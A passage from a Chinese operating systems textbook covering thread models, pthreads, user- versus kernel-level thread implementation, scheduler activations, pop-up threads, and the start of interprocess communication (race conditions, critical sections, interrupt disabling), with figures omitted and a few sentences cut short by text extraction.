如同本书的其他部分一样，这里假设TRUE为常数1。
另外，buf 和page 分别是保存工作请求和Web页面的相应结构。
有关多线程作用的第三个例子是那些必须处理极大量数据的应用。
通常的处理方式是，读进一块数 据，对其处理，然后再写出数据。
这里的问题是，如果只能使用阻塞系统调用，那么在数据进入和数据 输出时，会阻塞进程。
在有大量计算需要处理的时候，让CPU空转显然是浪费，应该尽可能避免。
多线程提供了一种解决方案，有关的进程可以用一个输入线程、一个处理线程和一个输出线程构造。
输入线程把数据读入到输入缓冲区中；处理线程从输入缓冲区中取出数据，处理数据，并把结果放到输 出缓冲区中；输出线程把这些结果写到磁盘上。
按照这种工作方式，输入、处理和输出可以全部同时进 行。
当然，这种模型只有当系统调用只阻塞调用线程而不是阻塞整个进程时，才能正常工作。
2.2.2 经典的线程模型
既然已经清楚为什么线程会有用以及如何使用它们，不如让我们用更进一步的眼光来审查一下上面 的想法。
进程模型基于两种独立的概念：资源分组处理与执行。
有时，将这两种概念分开会更好，这就 引入了“线程”这一概念。
下面先介绍经典的线程模型；之后我们会来研究“模糊进程与线程分界线” 的Linux线程模型。
理解进程的一个角度是，用某种方法把相关的资源集中在一起。
进程有存放程序正文和数据以及其 他资源的地址空间。
这些资源中包括打开的文件、子进程、即将发生的定时器、信号处理程序、账号信 息等。
把它们都放到进程中可以更容易管理。
另一个概念是，进程拥有一个执行的线程，通常简写为线程(thread) 。
在线程中有一个程序计数器， 用来记录接着要执行哪一条指令。
线程拥有寄存器，用来保存线程当前的工作变量。
线程还拥有一个堆
栈，用来记录执行历史，其中每一帧保存了一个已调用的但是还没有从中返回的过程。
尽管线程必须在 某个进程中执行，但是线程和它的进程是不同的概念，并且可以分别处理。
进程用于把资源集中到一起， 而线程则是在CPU 上被调度执行的实体。
在图2-11a中，可以看到三个传统的进程。
每个进程有自己的地址空间和单个控制线程。
相反，在 图2-11b中，可以看到一个进程带有三个控制线程。
尽管在两种情形中都有三个线程，但是在图2-11a中 ， 每一个线程都在不同的地址空间中运行，而在图2-11b中，这三个线程全部在相同的地址空间中运行。
当多线程进程在单CPU 系统中运行时，线程轮流运行。
从图2-1中，我们已经看到了进程的多道程 序设计是如何工作的。
通过在多个进程之间来回切换，系统制造了不同的顺序进程并行运行的假象。
多 线程的工作方式也是类似的。
CPU 在线程之间的快速切换，制造了线程并行运行的假象，好似它们在一 个比实际CPU 慢一些的CPU 上同时运行。
在一个有三个计算密集型线程的进程中，线程以并行方式运行， 每个线程在一个CPU 上得到了真实CPU 速度的三分之一。
图2-11 a) 三个进程，每个进程有一个线程；b) 一个进程带三个线程
进程中的不同线程不像不同进程之间那样存在很大的独立性。
所有的线程都有完全一样的地址空间， 这意味着它们也共享同样的全局变量。
由于各个线程都可以访问进程地址空间中的每一个内存地址，所 以一个线程可以读、写或甚至清除另一个线程的堆栈。
线程之间是没有保护的，原因是：1)不可能， 2)也没有必要。
这与不同进程是有差别的。
不同的进程会来自不同的用户，它们彼此之间可能有敌意， 一个进程总是由某个用户所拥有，该用户创建多个线程应该是为了它们之间的合作而不是彼此间争斗。
除了共享地址空间之外，所有线程还共享同一个打开文件集、子进程、定时器以及相关信号等，如图2- 12所示。
这样，对于三个没有关系的线程而言，应该使用图2-11a的结构，而在三个线程实际完成同一 个作业，并彼此积极密切合作的情形中，图2-11b则比较合适。
图2-12 第一列给出了在一个进程中所有线程共享的内容，第二列给出了每个线程自己的内容
图2-12中，第一列表项是进程的属性，而不是线程的属性。
例如，如果一个线程打开了一个文件，
该文件对该进程中的其他线程都可见，这些线程可以对该文件进行读写。
由于资源管理的单位是进程而 非线程，所以这种情形是合理的。
如果每个线程有其自己的地址空间、打开文件、即将发生的定时器等， 那么它们就应该是不同的进程了。
线程概念试图实现的是，共享一组资源的多个线程的执行能力，以便 这些线程可以为完成某一任务而共同工作。
和传统进程一样(即只有一个线程的进程),线程可以处于若干种状态的任何一个：运行、阻塞、
就绪或终止。
正在运行的线程拥有CPU 并且是活跃 的。
被阻塞的线程正在等待某个释放它的事件。
例 如，当一个线程执行从键盘读入数据的系统调用时， 该线程就被阻塞直到键入了输入为止。
线程可以被 阻塞，以便等待某个外部事件的发生或者等待其他 线程来释放它。
就绪线程可被调度运行，并且只要 轮到它就很快可以运行。
线程状态之间的转换和进 程状态之间的转换是一样的，如图2-2所示。
认识到每个线程有其自己的堆栈很重要，如 图2-13所示。
每个线程的堆栈有一帧，供各个被调 用但是还没有从中返回的过程使用。
在该栈帧中存 放了相应过程的局部变量以及过程调用完成之后使
图2-13 每个线程有其自己的堆栈
用的返回地址。
例如，如果过程X调用过程Y, 而 Y又调用Z, 那 么 当Z执行时，供X 、Y 和Z 使用的栈帧
会全部存在堆栈中。
通常每个线程会调用不同的过程，从而有一个各自不同的执行历史，这就是为什么 每个线程需要有自己的堆栈的原因。
当一个线程完成工作后，可以通过调用一个库过程(如thread_exit) 退出。
该线程接着消失，不再 可调度。
在某些线程系统中，通过调用一个过程，例如thread_join, 一个线程可以等待 一个(特定)线 程退出。
这个过程阻塞调用线程直到那个(特定)线程退出。
在这种情况下，线程的创建和终止非常类 似于进程的创建和终止，并且也有着同样的选项。
另一个常见的线程调用是thread_yield, 它允许线程自动放弃CPU 从而让另一个线程运行。
这样一个 调用是很重要的，因为不同于进程，(线程库)无法利用时钟中断强制线程让出CPU 。
所以设法使线程行 为“高尚”起来，并且随着时间的推移自动交出CPU, 以便让其他线程有机会运行，就变得非常重要。
有的调用允许某个线程等待另一个线程完成某些任务，或等待一个线程宣称它已经完成了有关的工作等。
通常而言，线程是有益的，但是线程也在程序设计模式中引入了某种程度的复杂性。
考虑一下 UNIX 中 的fork系统调用。
如果父进程有多个线程，那么它的子进程也应该拥有这些线程吗?
如果不是， 则该子进程可能会工作不正常，因为在该子进程中的线程都是绝对必要的。
然而，如果子进程拥有了与父进程一样的多个线程，如果父进程在read 系统调用(比如键盘)上被 阻塞了会发生什么情况?
是两个线程被阻塞在键盘上(一个属于父进程，另一个属于子进程)吗?
在键 入一行输入之后，这两个线程都得到该输入的副本吗?
还是仅有父进程得到该输入的副本?
或是仅有子 进程得到?
类似的问题在进行网络连接时也会出现。
另一类问题和线程共享许多数据结构的事实有关。
如果一个线程关闭了某个文件，而另一个线程还 在该文件上进行读操作时会怎样?
假设有一个线程注意到几乎没有内存了，并开始分配更多的内存。
在 工作一半的时候，发生线程切换，新线程也注意到几乎没有内存了，并且也开始分配更多的内存。
这样， 内存可能会被分配两次。
不过这些问题通过努力是可以解决的。
总之，要使多线程的程序正确工作，就 需要仔细思考和设计。
2.2.3 POSIX线程
为实现可移植的线程程序，IEEE 在IEEE 标准1003.1c中定义了线程的标准。
它定义的线程包叫作 pthread。
大 部 分UNIX 系统都支持该标准。
这个标准定义了超过60个函数调用，如果在这里列举一遍就 太多了。
这里仅描述一些主要的函数，以说明它是如何工作的。
图2-14中列举了这些函数调用。
所有pthread 线程都有某些特性。
每一个都含有一个标识符、 一组寄存器(包括程序计数器)和一组 存储在结构中的属性。
这些属性包括堆栈大小、调度参数以及其他线程需要的项目。
图2-14 一 些pthread 的函数调用
创建一个新线程需要使用pthread_create 调用。
新创建的线程的线程标识符会作为函数值返回。
这种 调用有意看起来很像fork 系统调用，其中线程标识符起着PID的作用，而这么做的目的主要是为了标识 在其他调用中引用的线程。
当一个线程完成分配给它的工作时，可以通过调用pthread_exit 来终止。
这个调用终止该线程并释 放它的栈。
一般一个线程在继续运行前需要等待另一个线程完成它的工作并退出。
可以通过pthread_join 线 程 调用来等待别的特定线程的终止。
而要等待线程的线程标识符作为一个参数给出。
有时会出现这种情况： 一个线程逻辑上没有阻塞，但感觉上它已经运行了足够长时间并且希望给另 外一个线程机会去运行。
这时可以通过调用pthread_yield 完成这一目标。
而进程中没有这种调用，因为 假设进程间会有激烈的竞争性，并且每一个进程都希望获得它所能得到的所有的CPU时间。
但是，由于 同一进程中的线程可以同时工作，并且它们的代码总是由同一个程序员编写的，因此，有时程序员希望 它们能互相给对方一些机会去运行。
下面两个线程调用是处理属性的。
pthread_attr_init 建立关联一个线程的属性结构并初始化成默认值。
这些值(例如优先级)可以通过修改属性结构中的域值来改变。
最 后 ，pthread_attr_destroy 删除一个线程的属性结构，释放它占用的内存。
它不会影响调用它的线 程。
这些线程会继续存在。
为了更好地了解pthread 是如何工作的，考虑图2-15提供的简单例子。
这里主程序在宣布它的意图之 后，循环NUMBER_OF_THREADS 次，每次创建一个新的线程。
如果线程创建失败，会打印出一条错 误信息然后退出。
在创建完所有线程之后，主程序退出。
当创建一个线程时，它打印一条一行的发布信息，然后退出。
这些不同信息交错的顺序是不确定的， 并且可能在连续运行程序的情况下发生变化。
pthread 调用不只是前面介绍的这几个，还有许多的pthread 调用会在讨论“进程与线程同步”之后 再介绍。
2.2.4 在用户空间中实现线程
有两种主要的方法实现线程包：在用户空间中和在内核中。
这两种方法互有利弊，不过混合实现方 式也是可能的。
我们现在介绍这些方法，并分析它们的优点和缺点。
第一种方法是把整个线程包放在用户空间中，内核对线程包一无所知。
从内核角度考虑，就是按正 常的方式管理，即单线程进程。
这种方法第一个也是最明显的优点是，用户级线程包可以在不支持线程 的操作系统上实现。
过去所有的操作系统都属于这个范围，即使现在也有一些操作系统还是不支持线程。
进程与线程 61
通过这一方法，可以用函数库实现线程。
图2-15 使用线程的一个例子程序
所有的这类实现都有同样的通用结构，如图2- 16a 所示。
线程在 一个运行时系统的上层运行，该运 行时系统是一个管理线程的过程的集合。
前面已经介绍过其中的四个过程：pthread_create,pthread_exit,
pthread_join 和pthread_yield 。
不过， 一般还会有更多的过程。
图2-16 a) 用户级线程包； b) 由内核管理的线程包
在用户空间管理线程时，每个进程需要有其专用的线 程 表 (thread table),用来跟踪该进程中的线 程。
这些表和内核中的进程表类似，不过它仅仅记录各个线程的属性，如每个线程的程序计数器、堆栈
指针、寄存器和状态等。
该线程表由运行时系统管理。
当一个线程转换到就绪状态或阻塞状态时，在该 线程表中存放重新启动该线程所需的信息，与内核在进程表中存放进程的信息完全一样。
当某个线程做了一些会引起在本地阻塞的事情之后，例如，等待进程中另一个线程完成某项工作， 它调用一个运行时系统的过程，这个过程检查该线程是否必须进入阻塞状态。
如果是，它在线程表中保 存该线程的寄存器(即它本身的),查看表中可运行的就绪线程，并把新线程的保存值重新装入机器的寄 存器中。
只要堆栈指针和程序计数器一被切换，新的线程就又自动投入运行。
如果机器有一条保存所有 寄存器的指令和另一条装入全部寄存器的指令，那么整个线程的切换可以在几条指令内完成。
进行类似 于这样的线程切换至少比陷入内核要快一个数量级(或许更多),这是使用用户级线程包的极大的优点。
不过，线程与进程有一个关键的差别。
在线程完成运行时，例如，在它调用thread_yield 时 ， pthread_yield 代码可以把该线程的信息保存在线程表中，进而，它可以调用线程调度程序来选择另一个 要运行的线程。
保存该线程状态的过程和调度程序都只是本地过程，所以启动它们比进行内核调用效率 更高。
另一方面，不需要陷入内核，不需要上下文切换，也不需要对内存高速缓存进行刷新，这就使得 线程调度非常快捷。
用户级线程还有另一个优点。
它允许每个进程有自己定制的调度算法。
例如，在某些应用程序中， 那些有垃圾收集线程的应用程序就不用担心线程会在不合适的时刻停止，这是一个长处。
用户级线程还 具有较好的可扩展性，这是因为在内核空间中内核线程需要一些固定表格空间和堆栈空间，如果内核线 程的数量非常大，就会出现问题。
尽管用户级线程包有更好的性能，但它也存在一些明显的问题。
其中第一个问题是如何实现阻塞系 统调用。
假设在还没有任何击键之前，一个线程读取键盘。
让该线程实际进行该系统调用是不可接受的， 因为这会停止所有的线程。
使用线程的一个主要目标是，首先要允许每个线程使用阻塞调用，但是还要 避免被阻塞的线程影响其他的线程。
有了阻塞系统调用，这个目标不是轻易地能够实现的。
系统调用可以全部改成非阻塞的(例如，如果没有被缓冲的字符，对键盘的read 操作可以只返回0 字节),但是这需要修改操作系统，所以这个办法也不吸引人。
而且，用户级线程的一个长处就是它可 以在现有的操作系统上运行。
另外，改变read 操作的语义需要修改许多用户程序。
在这个过程中，还有一种可能的替代方案，就是如果某个调用会阻塞，就提前通知。
在某些UNIX 版本中，有一个系统调用select可以允许调用者通知预期的read是否会阻塞。
若有这个调用，那么库过 程read 就可以被新的操作替代，首先进行select 调用，然后只有在安全的情形下(即不会阻塞)才进行 read调用。
如果read 调用会被阻塞，有关的调用就不进行，代之以运行另一个线程。
到了下次有关的运 行系统取得控制权之后，就可以再次检查看看现在进行read 调用是否安全。
这个处理方法需要重写部分 系统调用库，所以效率不高也不优雅，不过没有其他的可选方案了。
在系统调用周围从事检查的这类代 码称为包装器 (jacket或wrapper)。
与阻塞系统调用问题有些类似的是缺页中断问题，我们将在第3章讨论这些问题。
此刻可以认为， 把计算机设置成这样一种工作方式，即并不是所有的程序都一次性放在内存中。
如果某个程序调用或者 跳转到了一条不在内存的指令上，就会发生页面故障，而操作系统将到磁盘上取回这个丢失的指令(和 该指令的“邻居们”),这就称为页面故障。
在对所需的指令进行定位和读入时，相关的进程就被阻塞。
如果有一个线程引起页面故障，内核由于甚至不知道有线程存在，通常会把整个进程阻塞直到磁盘I/O 完成为止，尽管其他的线程是可以运行的。
用户级线程包的另一个问题是，如果一个线程开始运行，那么在该进程中的其他线程就不能运行， 除非第一个线程自动放弃CPU。
在一个单独的进程内部，没有时钟中断，所以不可能用轮转调度(轮流) 的方式调度线程。
除非某个线程能够按照自己的意志进入运行时系统，否则调度程序就没有任何机会。
对线程永久运行问题的一个可能的解决方案是让运行时系统请求每秒一次的时钟信号(中断),但 是这样对程序也是生硬和无序的。
不可能总是高频率地发生周期性的时钟中断，即使可能，总的开销也 是可观的。
而且，线程可能也需要时钟中断，这就会扰乱运行时系统使用的时钟。
就要持续进行select系统调用，以便检查read 系统调用是否安全。
对于那些基本上是CPU 密集型而且极 少有阻塞的应用程序而言，使用多线程的目的又何在呢?
由于这样的做法并不能得到任何益处，所以没 有人会真正提出使用多线程来计算前n个素数或者下象棋等一类工作。
2.2.5 在内核中实现线程
现在考虑内核支持和管理线程的情形。
如图2-16b所示，此时不再需要运行时系统了。
另外，每个 进程中也没有线程表。
相反，在内核中有用来记录系统中所有线程的线程表。
当某个线程希望创建一个 新线程或撤销一个已有线程时，它进行一个系统调用，这个系统调用通过对线程表的更新完成线程创建 或撤销工作。
内核的线程表保存了每个线程的寄存器、状态和其他信息。
这些信息和在用户空间中(在运行时系 统中)的线程是一样的，但是现在保存在内核中。
这些信息是传统内核所维护的每个单线程进程信息 (即进程状态)的子集。
另外，内核还维护了传统的进程表，以便跟踪进程的状态。
所有能够阻塞线程的调用都以系统调用的形式实现，这与运行时系统过程相比，代价是相当可观的。
当一个线程阻塞时，内核根据其选择，可以运行同一个进程中的另一个线程(若有一个就绪线程)或者 运行另一个进程中的线程。
而在用户级线程中，运行时系统始终运行自己进程中的线程，直到内核剥夺 它的CPU (或者没有可运行的线程存在了)为止。
由于在内核中创建或撤销线程的代价比较大，某些系统采取“环保”的处理方式，回收其线程。
当 某个线程被撤销时，就把它标志为不可运行的，但是其内核数据结构没有受到影响。
稍后，在必须创建 一个新线程时，就重新启动某个旧线程，从而节省了一些开销。
在用户级线程中线程回收也是可能的， 但是由于其线程管理的代价很小，所以没有必要进行这项工作。
内核线程不需要任何新的、非阻塞系统调用。
另外，如果某个进程中的线程引起了页面故障，内核 可以很方便地检查该进程是否有任何其他可运行的线程，如果有，在等待所需要的页面从磁盘读入时， 就选择一个可运行的线程运行。
这样做的主要缺点是系统调用的代价比较大，所以如果线程的操作(创 建、终止等)比较多，就会带来很大的开销。
虽然使用内核线程可以解决很多问题，但是也不会解决所有的问题。
例如，当一个多线程进程创建 新的进程时，会发生什么?
新进程是拥有与原进程相同数量的线程，还是只有一个线程?
在很多情况下， 最好的选择取决于进程计划下一步做什么。
如果它要调用exec 来启动一个新的程序，或许一个线程是正 确的选择；但是如果它继续执行，则最好复制所有的线程。
另一个话题是信号。
回忆一下，信号是发给进程而不是线程的，至少在经典模型中是这样的。
当一 个信号到达时，应该由哪一个线程处理它?
线程可以“注册”它们感兴趣的某些信号，因此当一个信号 到达的时候，可把它交给需要它的线程。
但是如果两个或更多的线程注册了相同的信号，会发生什么?
这只是线程引起的问题中的两个，但是还有更多的问题。
2.2.6 混合实现
人们已经研究了各种试图将用户级线程的优点和内核级线程的优点结合起来的方法。
一种方法是使 用内核级线程，然后将用户级线程与某些或者全部内核线程多路复用起来，如图2-17所示。
如果采用这 种方法，编程人员可以决定有多少个内核级线程和
集合。
图2-17 用户级线程与内核线程多路复用
2.2.7 调度程序激活机制
尽管内核级线程在一些关键点上优于用户级线程，但无可争议的是内核级线程的速度慢。
因此，研 究人员一直在寻找在保持其优良特性的前提下改进其速度的方法。
下面将介绍Anderson 等人(1992)设 计的一种方法，称为调度程序激活 (sche duler activation) 机 制 。
Edler 等人(1988)以及Scott 等人 (1990)就相关的工作进行了深入讨论。
调度程序激活工作的目标是模拟内核线程的功能，但是为线程包提供通常在用户空间中才能实现的 更好的性能和更大的灵活性。
特别地，如果用户线程从事某种系统调用时是安全的，那就不应该进行专 门的非阻塞调用或者进行提前检查。
无论如何，如果线程阻塞在某个系统调用或页面故障上，只要在同 一个进程中有任何就绪的线程，就应该有可能运行其他的线程。
由于避免了在用户空间和内核空间之间的不必要转换，从而提高了效率。
例如，如果某个线程由于 等待另一个线程的工作而阻塞，此时没有理由请求内核，这样就减少了内核-用户转换的开销。
用户空 间的运行时系统可以阻塞同步的线程而另外调度一个新线程。
当使用调度程序激活机制时，内核给每个进程安排一定数量的虚拟处理器，并且让(用户空间)运 行时系统将线程分配到处理器上。
这一机制也可以用在多处理器中，此时虚拟处理器可能成为真实的 CPU。
分配给一个进程的虚拟处理器的初始数量是一个，但是该进程可以申请更多的处理器并且在不用 时退回。
内核也可以取回已经分配出去的虚拟处理器，以便把它们分给需要更多处理器的进程。
使该机制工作的基本思路是，当内核了解到一个线程被阻塞之后(例如，由于执行了一个阻塞系统 调用或者产生了一个页面故障),内核通知该进程的运行时系统，并且在堆栈中以参数形式传递有问题 的线程编号和所发生事件的一个描述。
内核通过在一个已知的起始地址启动运行时系统，从而发出了通 知，这是对UNIX中信号的一种粗略模拟。
这个机制称为上行调用 (upcall)。
一旦如此激活，运行时系统就重新调度其线程，这个过程通常是这样的：把当前线程标记为阻塞并 从就绪表中取出另一个线程，设置其寄存器，然后再启动之。
稍后，当内核知道原来的线程又可运行时 (例如，原先试图读取的管道中有了数据，或者已经从磁盘中读入了故障的页面),内核就又一次上行调 用运行时系统，通知它这一事件。
此时该运行时系统按照自己的判断，或者立即重启动被阻塞的线程， 或者把它放入就绪表中稍后运行。
在某个用户线程运行的同时发生一个硬件中断时，被中断的CPU 切换进内核态。
如果被中断的进程 对引起该中断的事件不感兴趣，比如，是另一个进程的I/O完成了，那么在中断处理程序结束之后，就 把被中断的线程恢复到中断之前的状态。
不过，如果该进程对中断感兴趣，比如，是该进程中的某个线 程所需要的页面到达了，那么被中断的线程就不再启动，代之为挂起被中断的线程。
而运行时系统则启 动对应的虚拟CPU, 此时被中断线程的状态保存在堆栈中。
随后，运行时系统决定在该CPU上调度哪个 线程：被中断的线程、新就绪的线程还是某个第三种选择。
2.2.8 弹出式线程
不过，也可能有另一种完全不同的处理方式，在该处理方式中，一个消息的到达导致系统创建一个 处理该消息的线程，这种线程称为弹出式线程，如图2-18所示。
弹出式线程的关键好处是，由于这种线 程相当新，没有历史——没有必须存储的寄存器、堆栈诸如此类的内容，每个线程从全新开始，每一个 线程彼此之间都完全一样。
这样，就有可能快速创建这类线程。
对该新线程指定所要处理的消息。
使用 弹出式线程的结果是，消息到达与处理开始之间的时间非常短。
a) b)
图2-18 在消息到达时创建一个新的线程：a)消息到达之前；b)消息到达之后
在使用弹出式线程之前，需要提前进行计划。
例如，哪个进程中的线程先运行?
如果系统支持在内 核上下文中运行线程，线程就有可能在那里运行(这是图2-18中没有画出内核的原因)。
在内核空间中 运行弹出式线程通常比在用户空间中容易且快捷，而且内核空间中的弹出式线程可以很容易访问所有的 表格和I/O 设备，这些也许在中断处理时有用。
而另一方面，出错的内核线程会比出错的用户线程造成 更大的损害。
例如，如果某个线程运行时间太长，又没有办法抢占它，就可能造成进来的信息丢失。
2.2.9 使单线程代码多线程化
许多已有的程序是为单线程进程编写的。
把这些程序改写成多线程需要比直接写多线程程序更高的 技巧。
下面考察一些其中易犯的错误。
先考察代码， 一个线程的代码就像进程一样，通常包含多个过程，会有局部变量、全局变量和过程 参数。
局部变量和参数不会引起任何问题，但是有一个问题是，对线程而言是全局变量，并不是对整个 程序也是全局的。
有许多变量之所以是全局的，是因为线程中的许多过程都使用它们(如同它们也可能 使用任何全局变量一样),但是其他线程在逻辑上和这些变量无关。
作为一个例子，考虑由UNIX 维护的errno 变量。
当进程(或线程)进行系统调用失败时，错误码会 放入errno 。
在图2-19中，线程1执行系统调用access 以确定是否允许它访问某个特定文件。
操作系统把 返回值放到全局变量errno 里。
当控制权返回到线程1之后，并在线程1读取errno 之前，调度程序确认线 程1此刻已用完CPU 时间，并决定切换到线程2。
线程2执行一个open 调用，结果失败，导致重写errno, 于是给线程1的返回值会永远丢失。
随后在线程1执行时，它将读取错误的返回值并导致错误操作。
对于这个问题有各种解决方案。
一种解决方案是全面禁止全局变量。
不过这个想法不一定合适，因 为它同许多已有的软件冲突。
另一种解决方案是为每个线程赋予其私有的全局变量，如图2-20所示。
在 这个方案中，每个线程有自己的errno以及其他全局变量的私有副本，这样就避免了冲突。
在效果上，这
图2-19 线程使用全局变量所引起的错误
图2-20 线程可拥有私有的全局变量
个方案创建了新的作用域层，这些变量对一个线程中所有过程都是可见的。
而在原先的作用域层里，变 量只对一个过程可见，并在程序中处处可见。
访问私有的全局变量需要有些技巧，不过，多数程序设计语言具有表示局部变量和全局变量的方式， 而没有中间的形式。
有可能为全局变量分配一块内存，并将它转送给线程中的每个过程作为额外的参数。
尽管这不是一个漂亮的方案，但却是一个可用的方案。
还有另一种方案，可以引入新的库过程，以便创建、设置和读取这些线程范围的全局变量。
首先一 个调用也许是这样的：
create_global("bufptr");
该调用在堆上或在专门为调用线程所保留的特殊存储区上替一个名为bufptr 的指针分配存储空间。
无论 该存储空间分配在何处，只有调用线程才可访问其全局变量。
如果另一个线程创建了同名的全局变量， 由于它在不同的存储单元上，所以不会与已有的那个变量产生冲突。
访问全局变量需要两个调用：一个用于写入全局变量，另一个用于读取全局变量。
对于写入，类似有 set_global("bufptr",&buf);
它把指针的值保存在先前通过调用create_global 创建的存储单元中。
如果要读出一个全局变量，调用的 形式类似于
bufptr =read_global("bufptr");
这个调用返回一个存储在全局变量中的地址，这样就可以访问其中的数据了。
试图将单一线程程序转为多线程程序的另一个问题是，有许多库过程并不是可重入的。
也就是说， 它们不是被设计成下列工作方式的：对于任何给定的过程，当前面的调用尚没有结束之前，可以进行第 二次调用。
例如，可以将通过网络发送消息恰当地设计为，在库内部的一个固定缓冲区中进行消息组合， 然后陷入内核将其发送。
但是，如果一个线程在缓冲区中编好了消息，然后被时钟中断强迫切换到第二 个线程，而第二个线程立即用它自己的消息重写了该缓冲区，那会怎样呢?
类似的还有内存分配过程，例如UNIX 中 的malloc, 它维护着内存使用情况的关键表格，如可用内 存块链表。
在malloc 忙于更新表格时，有可能暂时处于一种不一致的状态，指针的指向不定。
如果在表 格处于一种不一致的状态时发生了线程切换，并且从一个不同的线程中来了一个新的调用，就可能会由 于使用了一个无效指针从而导致程序崩溃。
要有效解决这些问题意味着重写整个库，而这有可能引入一 些微妙的错误，所以这么做是一件很复杂的事情。
另一种解决方案是，为每个过程提供一个包装器，该包装器设置一个二进制位从而标志某个库处于 使用中。
在先前的调用还没有完成之前，任何试图使用该库的其他线程都会被阻塞。
尽管这个方式可以 工作，但是它会极大地降低系统潜在的并行性。
有些信号，如键盘中断，则不是线程专用的。
谁应该捕捉它们?
一个指定的线程?
所有的线程?
还 是新创建的弹出式线程?
进而，如果某个线程修改了信号处理程序，而没有通知其他线程，会出现什么 情况?
如果某个线程想捕捉一个特定的信号(比如，用户击键CTRL+C), 而另一个线程却想用这个信 号终止进程，又会发生什么情况?
如果有一个或多个线程运行标准的库过程以及其他用户编写的过程， 那么情况还会更复杂。
很显然，这些想法是不兼容的。
一般而言，在单线程环境中信号已经是很难管理 的了，到了多线程环境中并不会使这一情况变得容易处理。
由多线程引入的最后一个问题是堆栈的管理。
在很多系统中，当一个进程的堆栈溢出时，内核只是 自动为该进程提供更多的堆栈。
当一个进程有多个线程时，就必须有多个堆栈。
如果内核不了解所有的 堆栈，就不能使它们自动增长，直到造成堆栈出错。
事实上，内核有可能还没有意识到内存错误是和某 个线程栈的增长有关系的。
统是根本不行的。
至少可能需要重新定义系统调用的语义，并且不得不重写库。
而且所有这些工作必须 与在一个进程中有一个线程的原有程序向后兼容。
有关线程的其他信息，可以参阅Hauser 等人(1993) 和Marsh等人(1991)。
2.3 进程间通信
进程经常需要与其他进程通信。
例如，在一个shell 管道中，第一个进程的输出必须传送给第二个进 程，这样沿着管道传递下去。
因此在进程之间需要通信，而且最好使用一种结构良好的方式而不要使用 中断。
在下面几节中，我们就来讨论一些有关进程间通信(Inter Process Communication,IPC)的问题。
有必要说明，这三个问题中的两个问题对于线程来说是同样适用的。
第一个问题(即传递信息)对线 程而言比较容易，因为它们共享一个地址空间(在不同地址空间需要通信的线程属于不同进程之间通信的 情形)。
但是另外两个问题(需要梳理清楚并保持恰当的顺序)同样适用于线程。
同样的问题可用同样的 方法解决。
下面开始讨论进程间通信问题，不过请记住，同样的问题和解决方法也适用于线程。
2.3.1 竞争条件
在一些操作系统中，协作的进程可能共享一些彼此都能读写的公用存储区。
这个公用存储区可能在 内存中(可能是在内核数据结构中),也可能是一个共享文件。
这里共享存储区的位置并不影响通信的 本质及其带来的问题。
为了理解实际中进程间通信如何工作，我们考虑一个简单但很普遍的例子：一个 假脱机打印程序。
当一个进程需要打印一个文件时，它将文件名放在一个特殊的假脱机目录 (spooler directory) 下。
另一个进程( 打印机守护进程)则周期性地检查是否有文件需要打印，若有就打印并将
该文件名从目录下删掉。
设想假脱机目录中有许多槽位，编号依次为0,1, 2, …,每个槽位存放一个文件名。
同时假设有两个共 享变量：out, 指向下一个要打印的文件；in, 指向目录 中下一个空闲槽位。
可以把这两个变量保存在一个所有 进程都能访问的文件中，该文件的长度为两个字。
在某 一时刻，0号至3号槽位空(其中的文件已经打印完毕), 4号至6号槽位被占用(其中存有排好队列的要打印的文 件名)。
几乎在同一时刻，进程A和进程B都决定将一个 文件排队打印，这种情况如图2-21所示。
假 脱 机 目 录
4 abc
5 prog.c
6 prog.n 7
在Murphy 法则(任何可能出错的地方终将出错) 图2-21 两个进程同时想访问共享内存
生效时，可能发生以下的情况。
进程A读到in的值为7,
将7存在一个局部变量next_free_slot 中。
此时发生一次时钟中断，CPU 认为进程A已运行了足够长的时间， 决定切换到进程B。
进 程B也读取in, 同样得到值为7,于是将7存在B的局部变量next_free_slot 中。
在这 一时刻两个进程都认为下一个可用槽位是7。
进程B现在继续运行，它将其文件名存在槽位7中并将in的值更新为8。
然后它离开，继续执行其他操作。
2.3.2 临界区
怎样避免竞争条件?
实际上凡涉及共享内存、共享文件以及共享任何资源的情况都会引发与前面类 似的错误，要避免这种错误，关键是要找出某种途径来阻止多个进程同时读写共享的数据。
换言之，我 们需要的是互斥(mutual exclusion),即以某种手段确保当一个进程在使用一个共享变量或文件时，其 他进程不能做同样的操作。
前述问题的症结就在于，在进程A 对共享变量的使用未结束之前进程B 就使 用它。
为实现互斥而选择适当的原语是任何操作系统的主要设计内容之一，也是后面几节中要详细讨论 的主题。
避免竞争条件的问题也可以用一种抽象的方式进行描述。
一个进程的一部分时间做内部计算或另外 一些不会引发竞争条件的操作。
在某些时候进程可能需要访问共享内存或共享文件，或执行另外一些会导 致竞争的操作。
我们把对共享内存进行访问的程序片段称作临界区域 (critical region) 或临界区 (critical section)。
如果我们能够适当地安排，使得两个进程不可能同时处于临界区中，就能够避免竞争条件。
尽管这样的要求避免了竞争条件，但它还不能保证使用共享数据的并发进程能够正确和高效地进行 协作。
对于一个好的解决方案，需要满足以下4个条件：
1)任何两个进程不能同时处于其临界区。
2)不应对CPU的速度和数量做任何假设。
3)临界区外运行的进程不得阻塞其他进程。
4)不得使进程无限期等待进入临界区。
从抽象的角度看，人们所希望的进程行为如图2-22所示。
图2-22中进程A 在T₁ 时刻进入临界区。
稍 后，在T₂时刻进程B试图进入临界区，但是失败了，因为另一个进程已经在该临界区内，而一个时刻只 允许一个进程在临界区内。
随后，B 被暂时挂起直到T₃时 刻A离开临界区为止，从而允许B立即进入。
最 后 ，B 离开(在时刻T₄), 回到了在临界区中没有进程的原始状态。
图2-22 使用临界区的互斥
2.3.3 忙等待的互斥
本节将讨论几种实现互斥的方案。
在这些方案中，当一个进程在临界区中更新共享内存时，其他进 程将不会进入其临界区，也不会带来任何麻烦。
1. 屏蔽中断
在单处理器系统中，最简单的方法是使每个进程在刚刚进入临界区后立即屏蔽所有中断，并在就要 离开之前再打开中断。
屏蔽中断后，时钟中断也被屏蔽。
CPU 只有发生时钟中断或其他中断时才会进行 进程切换，这样，在屏蔽中断之后CPU 将不会被切换到其他进程。
于是， 一旦某个进程屏蔽中断之后， 它就可以检查和修改共享内存，而不必担心其他进程介入。
这个方案并不好，因为把屏蔽中断的权力交给用户进程是不明智的。
设想一下，若一个进程屏蔽中 断后不再打开中断，其结果将会如何?
整个系统可能会因此终止。
而且，如果系统是多处理器(有两个 或可能更多的处理器),则屏蔽中断仅仅对执行disable 指令的那个CPU 有效。
其他CPU 仍将继续运行，
并可以访问共享内存。
另一方面，对内核来说，当它在更新变量或列表的几条指令期间将中断屏蔽是很方便的。
当就绪进 程队列之类的数据状态不一致时发生中断，则将导致竞争条件。
